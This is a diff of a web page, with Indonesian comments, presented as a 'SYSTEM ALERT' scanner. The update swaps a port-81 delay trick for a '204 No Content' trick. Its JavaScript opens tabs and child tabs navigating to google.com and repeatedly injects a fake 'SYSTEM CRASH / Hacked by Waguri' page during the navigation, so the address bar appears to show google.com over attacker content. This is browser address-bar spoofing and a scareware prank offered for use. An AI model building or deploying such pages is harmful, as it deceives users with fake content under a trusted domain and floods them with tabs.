@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Port Spoofing Delay (Port 81)</title>
+<title>204 No Content Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Port Spoofing Delay).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (204 No Content Exploit).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -55,50 +55,57 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu Port Spoofing via Race Condition...";
+    statusDiv.textContent = "Memicu 204 No Content Exploit...";
 
     function picuTerusMenerus() {
         dipicu++;
         try {
-            // Membuka tab kosong
+            // 1. Buka tab kosong
             const w = window.open('about:blank', '_blank');
             
             if (w) {
                 try {
-                    // --- TRIK PORT DELAY (Menggunakan Port 81) ---
-                    // Port 81 jarang sekali digunakan untuk HTTPS, sehingga browser akan timeout lama
-                    w.location.href = 'https://google.com:81';
+                    // 2. Navigasi ke URL target (google.com) 
+                    w.location.href = 'https://google.com';
                     
+                    // 3. RACE CONDITION: Suntikkan konten saat navigasi masih berjalan
+                    // Kita gunakan queueMicrotask untuk eksekusi secepat mungkin
                     let count = 0;
                     let intv = setInterval(function() {
                         count++;
                         try {
-                            // Suntikkan konten "SYSTEM CRASH" saat browser tertahan
-                            w.document.write(`
-                                <!DOCTYPE html>
-                                <html>
-                                <head><title>Google</title></head>
-                                <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
-                                    <div>
-                                        <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
-                                        <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
-                                        <p style="color:#ff0; font-size:12px; margin-top:20px;">Port Spoofing Active (Port 81)</p>
-                                    </div>
-                                </body>
-                                </html>
-                            `);
+                            // Trik: Tulis konten seolah-olah itu adalah respons 204
+                            if (w.document) {
+                                w.document.open();
+                                w.document.write(`
+                                    <!DOCTYPE html>
+                                    <html>
+                                    <head><title>Google</title></head>
+                                    <body style="margin:0;padding:0;background:#000;color:#f00;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;text-align:center;">
+                                        <div>
+                                            <h1 style="font-size:60px; text-shadow:0 0 20px #f00;">SYSTEM CRASH</h1>
+                                            <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
+                                            <p style="color:#ff0; font-size:12px; margin-top:20px;">204 No Content Spoofing</p>
+                                            <p style="color:#aaa; font-size:10px; margin-top:10px;">Address Bar says: google.com</p>
+                                        </div>
+                                    </body>
+                                    </html>
+                                `);
+                                w.document.close();
+                            }
                         } catch(e) {}
                         
-                        // Hentikan setelah 3 detik
-                        if (count > 30) { clearInterval(intv); }
-                    }, 100);
+                        // Hentikan setelah 2 detik
+                        if (count > 20) { clearInterval(intv); }
+                    }, 50); // Eksekusi setiap 50ms selama browser memuat
                     
-                    // Trigger Race Condition Anak
+                    // 4. Trigger Race Condition Anak
                     setTimeout(function() {
                         try {
                             const wAnak = window.open('about:blank', '_blank');
                             if (wAnak) {
-                                wAnak.location.href = 'https://google.com:81';
+                                wAnak.location.href = 'https://google.com';
+                                // Suntikkan konten juga ke tab anak
                                 wAnak.document.write('<h1 style="color:red;font-family:monospace;text-align:center;margin-top:20%">SYSTEM CRASH</h1>');
                                 wAnak.document.close();
                             }
